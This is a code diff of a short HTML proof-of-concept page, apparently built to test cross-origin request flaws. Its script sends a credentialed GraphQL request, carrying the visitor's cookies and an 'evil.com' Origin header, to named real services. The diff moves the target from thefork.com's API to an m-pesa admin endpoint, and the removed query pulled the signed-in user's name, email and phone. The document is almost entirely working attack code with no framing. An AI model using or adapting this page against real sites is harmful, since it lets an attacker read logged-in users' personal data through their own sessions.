@@ -4,7 +4,7 @@
     <pre id="output"></pre>
 
     <script>
-      fetch("https://www.thefork.com/api/graphql", {
+      fetch("https://admin.m-pesa.africa/graphql", {
         method: "POST",
         credentials: "include",
         headers: {
@@ -12,7 +12,32 @@
           "Origin": "https://evil.com"
         },
         body: JSON.stringify({
-          query: "{ user { firstName lastName email phone } }"
+          operationName: "mainMenuQuery",
+          variables: {},
+          query: `query mainMenuQuery {
+            mainMenu {
+              data {
+                attributes {
+                  body {
+                    ... on ComponentMenuDropdown {
+                      id
+                      label
+                      submenu {
+                        id
+                        label
+                        url
+                      }
+                    }
+                    ... on ComponentMenuLink {
+                      id
+                      label
+                      url
+                    }
+                  }
+                }
+              }
+            }
+          }`
         })
       })
       .then(res => res.json())
